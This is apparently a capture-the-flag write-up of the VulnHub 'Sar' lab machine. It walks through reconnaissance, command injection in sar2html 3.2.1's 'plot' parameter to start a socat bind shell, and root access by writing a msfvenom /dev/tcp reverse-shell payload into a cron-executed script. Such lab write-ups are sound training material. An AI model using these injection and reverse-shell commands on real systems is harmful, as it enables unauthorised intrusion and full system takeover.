# Boot2RootCTF: *OSCP - Sar*

*Note: This box was completed long ago and I am going off of the VMware snapshot I saved after completion, some visuals will be missing and explained instead.*

## Objective

We must go from visiting a simple website to having root access over the entire web server.

We'll download the VM from [here](https://www.vulnhub.com/entry/sar-1,425/) and set it up with Oracle VirtualBox.

Once the machine is up, we get to work.

## Step 1 - Reconnaissance

After finding our IP address using ```ifconfig``` and locating the second host on the network, we can run an Nmap scan to probe it for information.

```
$ sudo nmap -sS -Pn -v -T4 192.168.8.91                                                                     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 09:41 EDT
Initiating ARP Ping Scan at 09:41
Scanning 192.168.8.91 [1 port]
Completed ARP Ping Scan at 09:41, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:41
Completed Parallel DNS resolution of 1 host. at 09:41, 0.01s elapsed
Initiating SYN Stealth Scan at 09:41
Scanning 192.168.8.91 [1000 ports]
Discovered open port 80/tcp on 192.168.8.91
Completed SYN Stealth Scan at 09:41, 0.09s elapsed (1000 total ports)
Nmap scan report for 192.168.8.91
Host is up (0.00049s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:5F:B9:14 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.032KB)
```

There's only an HTTP port open, not much to work with so far.

Some light reconnaissance reveals a ```robots.txt``` file. Opening it reveals a ```/sar2HTML/``` folder.

Going to ```192.168.8.91/sar2HTML/``` reveals a webpage that hosts software meant to turn SAR data into reports of some kind.

That's not so important as what the version of this software is, which we immediately learn is ```3.2.1```.

![image](https://user-images.githubusercontent.com/45502375/179242701-1d459e43-c791-40ff-a367-9279f44667d8.png)

## Step 2 - Exploitation

Using the command ```searchsploit sar2html 3.2.1```, we find a couple of RCE exploits.

```
------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Execution    | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution        | php/webapps/47204.txt
------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The contents of ```47204.txt``` contain the following documentation:

```
$ cat /usr/share/exploitdb/exploits/php/webapps/47204.txt
# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute
the command you entered. After command injection press "select # host" then your command's
output will appear bottom side of the scroll screen.
```

Meaning we can put a command directly in the URL and expect it to execute.

This means we can theoretically insert a bind or reverse shell command and expect to receive a connection from the target host.

Which is exactly what I did.

Using this command, ```socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash```, I set up a TCP listener on port 4443 that would immediately open a Bash shell upon receiving a connection.

Combining this payload with the exploit above gives me this: ```http://192.168.8.91/sar2HTML/index.php?plot=;socat%20-d%20-d%20TCP4-LISTEN:4443%20EXEC:/bin/bash```

Which leads to this

![image](https://user-images.githubusercontent.com/45502375/179244833-0b6dd449-d52d-41f3-9c09-fd5720b6be9d.png)

Given that the website is now permanently hanging, I assume that the command worked and a listener is now set up.

By using Netcat, I open a connection and immediately gain access and upgrade to a TTY shell.

```
$ sudo nc 192.168.8.91 4443
whoami
www-data
python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@sar:/var/www/html/sar2HTML$ ^Z
zsh: suspended  sudo nc 192.168.8.91 4443
                                                                                                                                                                                                                                            
┌──(meowmycks㉿catBook)-[~]
└─$ stty raw -echo;fg        
[1]  + continued  sudo nc 192.168.8.91 4443


www-data@sar:/var/www/html/sar2HTML$ export TERM=xterm
www-data@sar:/var/www/html/sar2HTML$
```

## Step 3 - Privilege Escalation

Now that I had a foothold in the server, I could focus on upgrading to root.

The first thing I did was start an HTTP server on my Kali box with Python using the command ```sudo python3 -m http.server 80```, allowing me to download my scripts from the target machine using ```wget``` requests.

```
sudo python3 -m http.server 80                                      
[sudo] password for meowmycks: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
I then downloaded a local copy of Linux Smart Enumeration (LSE) onto the target machine.

LSE allows me to scan the host for common privilege escalation points and some additional known vulnerabilities.

Kali:
```
192.168.8.91 - - [11/Jul/2022 09:41:47] "GET /lse.tar HTTP/1.1" 200 -
```
Target:
```
ww-data@sar:/var/www$ wget http://192.168.8.199/lse.tar
--2022-07-11 19:11:47--  http://192.168.8.199/lse.tar
Connecting to 192.168.8.199:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12820480 (12M) [application/x-tar]
Saving to: 'lse.tar'

lse.tar             100%[===================>]  12.23M  --.-KB/s    in 0.07s   

2022-07-11 19:11:47 (171 MB/s) - 'lse.tar' saved [12820480/12820480]
```

A crucial vulnerability was found in the cron jobs.

```
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... yes!
---
/var/spool/cron
/var/spool/cron/crontabs
/var/spool/cron/crontabs/root
---
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... yes!
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
[!] ret060 Can we write to executable paths present in cron jobs........... yes!
---
/etc/crontab:*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
---
[i] ret400 Cron files...................................................... skip
```

These results revealed that there were root-controlled cron tasks and that there were paths containing executables in which we had write permissions.

It also revealed some known CVE vulnerabilities, but using these would've been cheating since these probably weren't intended to be exploited.

```
===================================================================( CVEs )=====                                                                                                                                                           
[!] cve-2019-5736 Escalate in some types of docker containers.............. nope
[!] cve-2021-3156 Sudo Baron Samedit vulnerability......................... yes!
---
Vulnerable! sudo version: 1.8.21p2
---
[!] cve-2021-3560 Checking for policykit vulnerability..................... nope
[!] cve-2021-4034 Checking for PwnKit vulnerability........................ yes!
---
Vulnerable!
---
[!] cve-2022-0847 Dirty Pipe vulnerability................................. nope
[!] cve-2022-25636 Netfilter linux kernel vulnerability.................... nope

==================================( FINISHED )==================================
```

Nevertheless, I inspected the ```finally.sh``` script.

```
www-data@sar:/var/www/lse$ locate finally.sh
/var/www/html/finally.sh
www-data@sar:/var/www/lse$ cd ../html
www-data@sar:/var/www/html$ cat finally.sh
#!/bin/sh

./write.sh
```

The script executes another script called ```write.sh```, which didn't have anything interesting in it.

What's important here is the fact that it is called by ```root```, since it is executed with the help of a ```sudo ./finally.sh``` command present in cron.

Meaning, if we put a reverse shell in the script and wait for the cron job to execute, we'd have a shell as ```root```.

Using Msfvenom, I generated a reverse bash payload and wrote it into ```write.sh```

```
$ msfvenom -p cmd/unix/reverse_bash LHOST=192.168.8.199 LPORT=4444 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 72 bytes
bash -c '0<&96-;exec 96<>/dev/tcp/192.168.8.199/4444;sh <&96 >&96 2>&96'
...
www-data@sar:/var/www/html$ echo "bash -c '0<&96-;exec 96<>/dev/tcp/192.168.8.199/4444;sh <&96 >&96 2>&96'" > write.sh
```

Then I opened a Netcat listener on port 4444 and waited...

```
$ sudo nc -lvnp 4444                   
[sudo] password for meowmycks: 
listening on [any] 4444 ...
```

...and I got a connection.

```
connect to [192.168.8.199] from (UNKNOWN) [192.168.8.91] 34998
whoami
root
```

After that, I upgraded to a TTY shell again (cause why not?) and was ultimately able to retrieve the flag.

```
python3 -c "import pty;pty.spawn('/bin/bash')"
root@sar:/var/www/html# ^Z
zsh: suspended  sudo nc -lvnp 4444
                                                                                                                                                                                                                                           
┌──(meowmycks㉿catBook)-[~]
└─$ stty raw -echo;fg 
[1]  + continued  sudo nc -lvnp 4444


root@sar:/var/www/html# export TERM=xterm
root@sar:/var/www/html# cd ~
root@sar:~# cat root.txt
66f93d6b2ca96c9ad78a8a9ba0008e99
```

## Conclusion

Command injection is always fun to do, because it's an easy way to reveal a devastating vulnerability, should it exist.

This felt like a marginally easier one to do, but I still loved working on it.
